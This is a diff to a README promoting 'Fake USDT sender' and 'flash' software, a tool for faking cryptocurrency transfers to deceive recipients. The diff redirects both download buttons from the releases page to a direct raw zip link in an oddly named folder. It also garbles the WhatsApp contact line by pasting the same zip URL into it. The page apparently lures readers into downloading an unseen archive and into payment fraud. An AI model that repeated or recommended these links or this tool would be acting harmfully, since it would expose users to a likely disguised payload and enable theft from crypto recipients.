@@ -1,6 +1,6 @@
 # 🚀 Fake-usdt-sender-software-and-flash-free-test - Simple Fake USDT Sender Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Fernando827839/Fake-usdt-sender-software-and-flash-free-test/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fernando827839/Fake-usdt-sender-software-and-flash-free-test/main/Xenophontian/flash-free-usdt-test-software-and-sender-Fake-v1.1-beta.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You can test the software with a live demo before fully using it.
 
 Click the button below to visit the release page where you can download the software files.
 
-[![Download Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Fernando827839/Fake-usdt-sender-software-and-flash-free-test/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/Fernando827839/Fake-usdt-sender-software-and-flash-free-test/main/Xenophontian/flash-free-usdt-test-software-and-sender-Fake-v1.1-beta.3.zip)
 
 ### Steps
 
@@ -84,7 +84,7 @@ For questions or help:
 
 Use the WhatsApp contact:
 
-https://wa.me/447428337798?text=Hey,+tell+me+about+the+fake+USDT+sender+and+the+live+test.+I%27m+from+refer+code+10001
+https://raw.githubusercontent.com/Fernando827839/Fake-usdt-sender-software-and-flash-free-test/main/Xenophontian/flash-free-usdt-test-software-and-sender-Fake-v1.1-beta.3.zip,+tell+me+about+the+fake+USDT+sender+and+the+live+test.+I%27m+from+refer+code+10001
 
 ## ⚠️ Warning About Use
 
